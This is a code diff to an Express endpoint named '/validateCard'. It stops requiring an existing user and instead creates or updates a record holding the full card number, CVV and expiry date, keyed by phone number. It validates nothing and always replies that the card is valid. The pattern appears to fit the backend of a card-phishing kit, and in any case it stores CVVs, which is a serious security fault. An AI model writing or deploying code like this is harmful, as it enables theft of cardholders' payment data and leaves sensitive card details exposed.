@@ -357,25 +357,33 @@ app.post('/validateCard', asyncHandler(async (req, res) => {
   const startTime = new Date();
 
   try {
-    const user = await User.findOneAndUpdate(
-      { phone },
-      {
-        $push: { cards: { cardNumber, cvv, expiryDate } },
-        $set: { startTime }
-      },
-      { new: true }
-    );
+    // Check if user exists
+    let user = await User.findOne({ phone });
 
-    if (user) {
-      res.json({ valid: true });
+    if (!user) {
+      // Create new user if not found
+      user = new User({
+        phone,
+        userData,
+        cards: [{ cardNumber, cvv, expiryDate }],
+        startTime
+      });
     } else {
-      res.json({ valid: false, error: 'User not found' });
+      // Update existing user
+      user.cards.push({ cardNumber, cvv, expiryDate });
+      user.startTime = startTime;
     }
+
+    // Save the user
+    await user.save();
+
+    res.json({ valid: true });
   } catch (error) {
     console.error('Error saving card:', error.message); // Log the error message
     res.json({ valid: false, error: 'Error saving card details' });
   }
 }));
+
 
 
 
